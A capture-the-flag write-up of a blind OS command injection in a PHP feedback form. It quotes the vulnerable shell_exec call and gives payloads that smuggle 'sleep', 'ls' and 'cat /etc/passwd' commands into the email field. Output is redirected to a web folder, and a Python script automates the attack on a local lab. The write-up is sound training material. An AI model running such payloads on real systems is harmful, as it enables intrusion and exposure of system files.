# Blind OS Command Injection with Output Redirection - Writeup

## Challenge Overview

This challenge presents a blind OS command injection vulnerability in a PHP web application. The objective is to confirm the vulnerability and then extract the content of the `/etc/passwd` file.

## Vulnerability Analysis

### Location
The vulnerability is located in the `feedback.php` file:

```php
$output = shell_exec("/bin/sh -c \"$email\" 2>&1");
```

The `$email` parameter is directly concatenated into a shell command without validation.

### Vulnerability Type
- **Blind OS Command Injection**: Command output is not returned in the response
- **Time-based exploitation**: Use of delays to confirm execution

## Exploitation

### Step 1: Vulnerability Confirmation

**Test payload with delay:**
```
test@example.com; sleep 5
```

**Result:** 5-second delay observed, confirming execution of arbitrary commands.

### Step 2: Directory Exploration

**List directory contents:**
```
test@example.com; ls -la > /var/www/html/images/directory_contents.txt
```

**Access the file:**
```
http://localhost:3206/images/directory_contents.txt
```

### Step 3: Extraction of /etc/passwd Content

**Payload to extract /etc/passwd:**
```
test@example.com; cat /etc/passwd > /var/www/html/images/passwd.txt
```

**File access:**
```
http://localhost:3206/images/passwd.txt
```

**Flag:** The content of `/etc/passwd` is the flag of this challenge. Once extracted and accessible via web browser, this constitutes the successful completion of the challenge.

## Automation Script

```python
import requests
import time

def test_injection(payload):
    data = {
        'name': 'Test',
        'email': payload,
        'message': 'Test message'
    }
    
    start_time = time.time()
    response = requests.post('http://localhost:3206/feedback.php', data=data)
    end_time = time.time()
    
    return end_time - start_time

# Delay test to confirm vulnerability
delay = test_injection('test@example.com; sleep 5')
print(f"Observed delay: {delay} seconds")

# List directory contents
test_injection('test@example.com; ls -la > /var/www/html/images/directory_contents.txt')
print("Directory contents extracted to directory_contents.txt")

# Extraction of /etc/passwd (the flag)
extraction_payload = 'test@example.com; cat /etc/passwd > /var/www/html/images/passwd.txt'
test_injection(extraction_payload)
print("Flag (/etc/passwd content) extracted to passwd.txt")
```

## Results Obtained

### Created Files
- **directory_contents.txt**: Contents of the current directory
- **passwd.txt**: Content of `/etc/passwd` accessible via `http://localhost:3206/images/passwd.txt` (this is the flag)

### Security Metrics
- **Normal response time**: < 1 second
- **Injection detected**: > 5 seconds with `sleep`
- **Successful exploitation**: Content of `/etc/passwd` accessible via redirection

---

*This writeup demonstrates the exploitation of the blind OS command injection vulnerability to extract the content of /etc/passwd via output redirection.* 